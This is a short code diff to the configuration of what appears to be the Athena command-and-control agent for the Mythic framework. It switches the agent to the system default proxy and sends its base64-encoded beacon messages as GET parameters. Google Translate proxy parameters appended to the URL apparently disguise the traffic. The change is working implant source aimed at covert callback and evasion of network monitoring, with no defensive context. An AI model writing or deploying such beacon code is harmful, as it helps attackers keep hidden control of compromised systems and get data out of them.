@@ -66,6 +66,7 @@ namespace Athena.Config
             this.proxyUser = "proxy_user";
             this.psk = "AESPSK";
 
+/*
             if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
             {
                 WebProxy wp = new WebProxy()
@@ -79,6 +80,12 @@ namespace Athena.Config
                 }
                 handler.Proxy = wp;
             }
+*/
+
+            // get system proxy settings
+            WebProxy wp = (WebProxy) WebProxy.GetDefaultProxy();
+            handler.Proxy = wp;
+
 
             this.client = new HttpClient(handler);
 
@@ -116,10 +123,7 @@ namespace Athena.Config
                 {
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
-                
-                // StringContent agentMessage = new StringContent(json);
-                // var tmpreq = Globals.mc.MythicConfig.currentConfig.getURL + '=' + agentMessage;
-                
+                          
                 string happyending = "&_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ru&_x_tr_hl=ru&_x_tr_pto=wapp";
                 var tmpreq = Globals.mc.MythicConfig.currentConfig.getURL + '=' + json + happyending;
 
